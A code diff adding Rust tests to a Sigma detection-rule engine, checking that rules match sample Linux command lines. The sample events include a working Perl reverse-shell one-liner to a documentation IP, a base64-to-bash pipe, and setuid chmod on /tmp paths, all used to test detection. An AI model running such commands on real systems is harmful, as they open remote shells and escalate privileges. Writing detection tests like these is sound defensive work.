@@ -217,3 +217,83 @@ fn sequence_exclusions_and_groups_are_and_constraints() {
     assert!(matches(y, &event("alpha beta")));
     assert!(!matches(y, &event("alpha beta benign")));
 }
+
+// Exact upstream fixtures from SigmaHQ53423dac8742ef6a44fb73f23f049e84594a66ce.
+// Only the test-only native product gate is removed for portable predicate replay.
+#[test]
+fn upstream_base64_pipe_matches_unquoted_agent_argv_not_shell_quote_artifact() {
+    let yaml = include_str!("fixtures/sigmahq_base64_pipe.yml").replace("    product: linux\n", "");
+    let mut e = event("sh -c echo ZWNobyBoaQ== | base64 -d | bash");
+    e.process = "sh".into();
+    e.file_path = Some("/usr/bin/sh".into());
+    assert!(matches(&yaml, &e));
+    e.command_line = Some("sh -c 'echo ZWNobyBoaQ== | base64 -d | bash'".into());
+    assert!(
+        !matches(&yaml, &e),
+        "upstream suffix does not consume a shell quote"
+    );
+    e.command_line = Some("sh -c echo ZWNobyBoaQ== | base64 -d".into());
+    assert!(
+        !matches(&yaml, &e),
+        "decoding without pipe-to-shell is not this rule"
+    );
+}
+
+#[test]
+fn upstream_perl_requires_complete_reverse_shell_not_socket_setup() {
+    let yaml =
+        include_str!("fixtures/sigmahq_perl_reverse_shell.yml").replace("    product: linux\n", "");
+    let mut e = event(
+        r#"perl -e use Socket;$i="203.0.113.9";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};"#,
+    );
+    e.process = "perl".into();
+    e.file_path = Some("/usr/bin/perl".into());
+    assert!(matches(&yaml, &e));
+    e.command_line = Some(r#"perl -e use Socket;$i="203.0.113.9";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))"#.into());
+    assert!(!matches(&yaml, &e));
+}
+
+#[test]
+fn authored_setuid_writable_path_matches_mode_and_target_together() {
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigma");
+    let identity = "linux_setuid_setgid_writable_path";
+    let fires = |command: &str| {
+        let mut engine = TemporalEngine::new();
+        for entry in std::fs::read_dir(&root).unwrap() {
+            let path = entry.unwrap().path();
+            if path.extension().and_then(|s| s.to_str()) != Some("yml") {
+                continue;
+            }
+            if let Ok(rule) = compile_sigma_rule(
+                &std::fs::read_to_string(path)
+                    .unwrap()
+                    .replace("  product: linux\n", ""),
+            ) {
+                engine.add_rule(rule);
+            }
+        }
+        let mut e = event(command);
+        e.process = "chmod".into();
+        e.file_path = Some("/usr/bin/chmod".into());
+        engine.observe(&e).iter().any(|name| name == identity)
+    };
+    for command in [
+        "chmod u+s /tmp/bash",
+        "chmod 4755 /dev/shm/x",
+        "chmod g+s /var/tmp/y",
+    ] {
+        assert!(fires(command), "{command}");
+    }
+    for command in [
+        "chmod u+s /usr/local/bin/tool",
+        "chmod 755 /tmp/x",
+        "chmod 1777 /tmp/d",
+    ] {
+        assert!(!fires(command), "{command}");
+    }
+    let yaml: serde_yaml::Value = serde_yaml::from_str(
+        &std::fs::read_to_string(root.join("linux_setuid_setgid_writable_path.yml")).unwrap(),
+    )
+    .unwrap();
+    assert_eq!(yaml["level"].as_str(), Some("medium"));
+}
